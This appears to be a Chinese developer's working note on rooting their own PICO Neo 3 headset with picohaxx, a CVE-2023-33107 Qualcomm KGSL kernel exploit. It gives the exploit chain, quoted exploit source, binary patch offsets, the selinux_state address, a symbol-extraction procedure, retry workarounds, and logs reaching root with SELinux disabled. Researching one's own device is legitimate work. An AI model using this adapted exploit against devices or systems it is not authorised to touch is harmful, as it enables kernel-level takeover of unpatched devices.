# 06 · 免解 BL 保数据 root（CVE-2023-33107 / picohaxx）

> 目的：拿到头显 root，**不解 Bootloader、不恢复出厂、不动 userdata**。
> 工具：`src/windows/temp/picohaxx.neo3.bin`（由 `get_deps.ps1` 自动拉取并打补丁，已适配 Neo 3）。
> 状态：**2026-10-04 已在本机 PICO Neo 3 上实测成功**。

## ⚠️ 本机没有「原生 adb root」捷径（实测）

设备带 PICO 自家的属性：

```
persist.pvr.adb.root = 1        ← 只是个标记，不代表 adbd 以 root 跑
ro.pvr.adb_noauth    = 1        ← adb 免授权（所以 adb connect 不用配对）
```

实测 `picohaxx -unroot` 之后：

```
uid=2000(shell)   Enforcing   service.adb.root=0   adbd 属主=shell
```

⇒ **`persist.pvr.adb.root=1` 不会让 adbd 以 root 运行**，picohaxx 每次开机都必需，没有捷径。

## `-- cmd` 与 adbd 无关：提权在进程内完成（2026-10-05 读源码核实）

上游 `root.c` 的 `postExploit()`：

```c
override_context("u:r:su:s0");       // 先把本进程的 SELinux 上下文切成 su
if(g_ftpd) ftpd(21);
if(g_adbd) patch_ADBD();             // ★ 只有 g_adbd 才碰 adbd
if(g_custom_spawn_args) {            //   "-- cmd" 走这里
    ...
    int r = execvp(args[0], args);   // ★ 同一个进程直接 exec，继承已提权的 cred
}
```

提权本身是日志里的 `[5] Patching UID and CAPS in-place.` —— 对**自己 task 的 `cred`**（`current_task_phys + CRED_OFFSET`）就地改写。

⇒ **adbd 是不是 root，完全不影响 `-- cmd` 的权限**。`-noadbd`（由 `picohaxx.c` 的 `cfg_bool()` 展开成 `-adbd` / `-noadbd`）只是把 `g_adbd` 置 0 ⇒ 不执行 `patch_ADBD()` ⇒ 不会 `kill_adbd()` / `exit(21)`。
⇒ 所以 Termux 路径能「提权 + 注入」一次调用做完；PC 路径仍要分两步（它要的正是 root adbd）。

**旁证（怎么判断某个 `frida-inject` 是不是 root）**：非 root 的 `frida-inject` **一定**先往 stderr 打 `Unable to save SELinux policy to the kernel: Permission denied`（本机实测，rc=4）⇒ 日志里没有这行，就说明它是 root。

## ⚠️ exploit 是偶发失败的：同一开机跑多了会稳定挂

同一开机里前几次 `picohaxx` 都成功，跑多了之后会在提权阶段**确定性**中止：

```
[0] Starting Privilege Escalation...
[+] Offsets matched: 202409100313
selinux_enforcing: ffffff3035785c01          ← 标定跑偏时的假地址（正常形如 ffffff800aab5001）
[!!!] FATAL: SPINLOCK TIMEOUT at root.c:206  ← 读内核 spinlock 超时，它自己中止
```

关键点：

- **不会写坏东西**：日志里 `8-bit WRITE … [PATCH] …` 那三行不会出现 —— 它在写之前就停了，系统完好（实测 adbd/服务都照常）。
- **重启头显就恢复**（每个 run 都会留下喷子进程 + `pte_dummy`/PTE 垃圾，标定会被带偏；root 本来就是一次性的）。
- **紧接着重试就成功**：实测同一条命令失败后，隔几十秒再跑一次就拿到了正确标定（`selinux_enforcing: ffffff800aab5001`）并一路走完（root + 注入 `已注入 pid=…`）⇒ 所以"重试"是正解，别当成坏掉。
- 根因（读源码）：`escalate_privs()` 一上来就用 exploit 自己的读写原语取表里的 `selinux_state` 常量；那次 2.5 TB 别名映射落点不好时，连这个常量都被读成垃圾 ⇒ 后面的写跑到错页 ⇒ spinlock 超时 ⇒ 中止。
- 所以脚本都带重试：`start_touch.sh` 重试**注入器**；Termux 流程重试 `picohaxx -adbd`（两次不成才回退 `-noadbd`）。看到 `SPINLOCK TIMEOUT` 就再跑一次，或者重启头显。

## ⚠️ 陷阱：picohaxx 会让无线 adb 掉线

`root.c` 的 `patch_ADBD()`：

```c
system_resetprop(NULL, "-n", "service.adb.root", "1", NULL);
system_magiskpolicy(NULL, "--live", "allow adbd adbd process setcurrent", ...);
system("setprop persist.adb.tcp.port 5555");     // ← 只设 persist
kill_adbd();                                      // ← pkill -9 adbd
```

**问题**：`adbd` 启动时读的是**易失**的 `service.adb.tcp.port`（或 `persist.adb.tcp.port`），
而 picohaxx 只设了 `persist.*`。`pkill -9 adbd` 之后 USB gadget 也要重新枚举
⇒ **无线 adb 与 USB adb 会一起断**，且从设备本机（Termux）尤其难恢复。

### 实测（logcat 证据）

```
04:15:11.557  PICOHAXX: patching adbd...
04:15:11.610  SELinux: policy capability ...            ← magiskpolicy --live
04:15:12.567  PICOHAXX: setting persist.adb.tcp.port to 5555...
04:15:12.579  KERNEL: avc: denied { set } for property=persist.adb.tcp.port
                       scontext=u:r:su:s0               ← ★ 这个 setprop 被 SELinux 拒了
04:15:12.604  PICOHAXX: restarting adbd...
04:15:12.732  AdbDebuggingManager: Read failed with count -1
```

**但是**（2026-10-05 更正）：

- **`adb tcpip 5555` 本身没问题**（实测单独跑：adbd 重启后仍以 root 跑、仍监听 `:::5555`）
- **从 PC 走 TCP 跑 picohaxx 也没问题**（实测成功：`uid=0(root)`、adbd root、TCP 正常）

### 结论：Termux 侧**也**走 adb（借 adbd 跑），但客户端必须换端口

之前"设备本机 adb 连不回"是两件事叠在一起，都不是"adb 这条路不行"：

1. **补成 root 的 adbd 自己占着 `127.0.0.1:5037`**（实测：`adbd --root_seclabel=u:r:su:s0` 的 fd 就指着那个 LISTEN socket）
   ⇒ 设备端 adb 客户端再起 server 会 `could not install *smartsocket* listener: Address already in use` 然后 abort
   ⇒ **让客户端的 server 换端口**：`export ANDROID_ADB_SERVER_PORT=5038`（或每条命令 `adb -P 5038 …`），本机设备照样认成 `emulator-5554`。
2. **Termux 直跑注入器必然失败**：app 进程的 seccomp 过滤器跨 `exec` 继承 ⇒ `frida-inject` 被 SIGSYS 打死（`rc=159`、日志恒 0 字节）。

⇒ 所以 Termux 流程是「借 adbd 跑整条链 + 客户端换 server 端口」，细节见 `docs/notes/09-termux.md`。

### 另外两个坑（实测）

**① `patch_ADBD()` 末尾 `exit(21)`** —— `kill_adbd()` 就是 `system("pkill -9 adbd"); exit(21);`
⇒ **第一次跑（原本没 root）时，`picohaxx -- <cmd>` 的 `<cmd>` 根本不会执行**。
必须分两步：先 `picohaxx -noftpd` 提权，再 `picohaxx -noftpd -- <cmd>`（第二次已是 root，跳过补丁）。

**② app 域读不到 `settings`，而 fallback 是坏的** —— Termux 里跑会：

```
[*] Device Firmware Version: cmd: Failure calling service settings: Failed transaction (2147483646)
[-] Unsupported Firmware version!
```

源码的 fallback 读 `ro.pvr.internal.version` 并把 `_` 换 `-`，
但**编译版实测返回空串**（`Device Firmware Version: ` 后直接 Unsupported）。
⇒ 用 **PATH shim**（假 `settings` 直接吐版本串）绕过。
另外已把 `offsets.h` 表串改成只留 build 时间戳 `202409100313`，
这样短横线/下划线两种形式都能 `strstr` 命中（原表只有短横线形式）。

## 结论

`github.com/264312431/picohaxx` 是可用方案。原作者只标了 PICO 4，**Neo 3 需要一处适配**（见下）。

- 漏洞：Qualcomm Adreno/KGSL IOMMU 整数溢出（`kgsl_ioctl_gpuobj_import` / `kgsl_ioctl_map_user_mem` + `KGSL_USER_MEM_TYPE_ADDR`）
- 链：rbtree 插入 BOGUS 条目 → 竞态 `mmap` → IOMMU PTE 悬垂 → 释放页被 `task_struct` 复用 → GPU 命令读写 → 覆写 `task_struct->addr_limit = KERNEL_DS`
- 官方补丁在 `clo/la/kernel/msm-4.19`，2023-10 才修；本机 `ro.build.version.security_patch = 2021-04-05` ⇒ 必然未修
- 攻击面：`/dev/kgsl-3d0` 是 `crw-rw-rw-`，`shell` 域可直接 `open` ⇒ 不需要 app、不需要 usb 调试以外的任何前置

**不改磁盘**：`patch_ADBD` 用 `resetprop -n`（内存属性）+ `magiskpolicy --live`（内存策略），重启即失效。
唯一会落盘的是 `setprop persist.adb.tcp.port 5555` —— 这条**是有意保留的**
（开发者设置里本来也开着无线 adb，本质就是同一个属性），它让重启后无线 adb 自动可用。

## Neo 3 适配（唯一的改动）

picohaxx 的 `offsets.h` 表是 PICO 4 的，`selinux_state` 硬编码 `0xffffff800aabb000`。
Neo 3 是另一个构建，需要换成 **`0xffffff800aab5000`**。

取符号的方法（无需 root）：

1. 官方 OTA：`https://alistatic.pui.picovr.com/5.9.9-202409100313-RELEASE-user-neo3-b5349-37aaf2be54.zip`（PICO OS 官网选「PICO Neo3 企业版/Pro/Pro Eye」）
2. `remotezip` 取 `boot.img`（96 MB）→ Android boot v2 header（`page=4096`）→ kernel 在 `offset=4096`，`kernel_size=35172368`
3. 是 **未压缩的 raw arm64 `Image`**（magic `ARMd`，`text_offset=0x80000`）
4. `uv run --with vmlinux-to-elf vmlinux-to-elf kernel.bin out.elf` → 122017 个符号，基址自动猜为 `0xffffff8008080000`

交叉验证：OTA 内核 build 串 `#1 SMP PREEMPT Tue Sep 10 04:33:49 CST 2024` 与设备 `uname -v` **逐字一致**。

### 符号对照

| 符号                         | Neo 3（链接期）          | picohaxx 表（PICO 4） |                |
| ---------------------------- | ------------------------ | --------------------- | -------------- |
| `_text`                      | `0xffffff8008080000`     | `0xffffff8008080000`  | ✅ 同          |
| `kptr_restrict`              | `0xffffff800a018ea0`     | `0xffffff800a018ea0`  | ✅ 同          |
| `sysctl_perf_event_paranoid` | `0xffffff800a00c1d4`     | `0xffffff800a00c1d4`  | ✅ 同          |
| `selinux_state`              | **`0xffffff800aab5000`** | `0xffffff800aabb000`  | ❌ 差 `0x6000` |

⇒ **只需改表里一项**。

### 二进制补丁（预编译 `picohaxx`，未 strip，1478056 B）

| 文件偏移   | 原值                 | 新值                           | 说明          |
| ---------- | -------------------- | ------------------------------ | ------------- |
| `0x34b6`   | `5.9.9-202408300028` | **`202409100313`**（NUL 补位） | 见下          |
| `0x164ef8` | `0xffffff800aabb000` | `0xffffff800aab5000`           | selinux_state |

（`0x164ef8` = `.data.rel.ro` 段 vaddr `0x166ef8` → file offset；表项 `{char* fw_ver; u64 selinux_state;}` 每项 16 字节）

**为什么表串只留 `202409100313`**：picohaxx 有两条识别路径，分隔符不一样 ——

| 路径                                                        | 取到的串                                     | 分隔符 |
| ----------------------------------------------------------- | -------------------------------------------- | ------ |
| `settings get system confirm_smartisan_version`（shell 域） | `5.9.9-202409100313-RELEASE-user-neo3-b5349` | `-`    |
| fallback `ro.pvr.internal.version`（app 域）                | `..._sv5.9.9_202409100313_neo3_b5349_user`   | `_`    |

原表只有短横线形式 ⇒ app 域下永远匹配不上（见下文坑 ②）。
改成只留 build 时间戳后，`strstr` 对**两种形式都能命中**，一条补丁解决两条路。

**已实测两种路径都匹配成功**（`[+] Offsets matched: 202409100313`）。

## 实测记录

```
$ ./picohaxx -v
[*] Device Firmware Version: 5.9.9-202409100313-RELEASE-user-neo3-b5349
[+] Offsets matched: 5.9.9-202409100313
seOffset: 0xffffff800aab5001        ← selinux_state + 1，与内核符号一致

$ ./picohaxx -noftpd -- /system/bin/id
✅ FOUND OUR TASK in 1431 hops at phys 0x0000000178DCBF00 !!
[+] Detected task_struct Epoch 3 layout (FW 5.9 - 5.11+)
[5] Patching UID and CAPS in-place.
⌛ [50460.640 ms] TOTAL
uid=0(root) ... context=u:r:su:s0
```

- 耗时约 **50 秒**（含 UAF 竞态重试 + 1431 跳 task walk）。`-dbg` 会明显更慢。
- 之后 `adb shell` 默认即 `uid=0(root)`。
- **KASLR 确实生效**（`kernel_slide = 0x1d65800000`），但 `KallSym2Phys` 只用相对偏移 ⇒ 不受影响。
- 设备侧读到的 kallsyms（patch 后 `kptr_restrict=0` 可读）确认所有**相对偏移**与提取值完全一致。
- `kernelbase_phys = 0xA0080000` 对 Neo 3 **也正确**（由 `selinux_state` 写入生效反证）。

## 副作用与清理

| 项                                                                          | 性质                   | 处理                                        |
| --------------------------------------------------------------------------- | ---------------------- | ------------------------------------------- |
| SELinux → Permissive（`selinux_enforcing=0`）                               | 内存                   | 重启恢复                                    |
| `kptr_restrict=0`、`sysctl_perf_event_paranoid=1`                           | 内存                   | 重启恢复                                    |
| `ro.debuggable=1`、`ro.boot.verifiedbootstate=orange`、`service.adb.root=1` | 内存（`resetprop -n`） | 重启恢复                                    |
| `persist.adb.tcp.port=5555`                                                 | **落盘**               | 已清除（`setprop persist.adb.tcp.port ''`） |
| `/data/local/tmp/{picohaxx,haxx.log,haxx2.log,pte_dummy}`                   | 落盘                   | 可删                                        |
| 内核 WARN `arm_lpae_init_pte+0x98`（`io-pgtable-arm.c:406`）                | 日志                   | 设计内，利用路径必经；无 panic/oops         |

**userdata 完好**：`/sdcard` 28 项、`/data/data` 202 项、第三方包 13 个，未恢复出厂。

## 备注

- 默认模式会开 `persist.adb.tcp.port=5555` + root ftpd(21)。局域网环境务必事后清除/不用 ftpd（`-noftpd`）。
- 想撤销：`./picohaxx -unroot`。
- 不想改 adbd 就跑 `-noadbd -noftpd -- <cmd>`，每次 ~50 秒。
- 换固件（升级/降级）后 `selinux_state` 会变，必须重取符号。
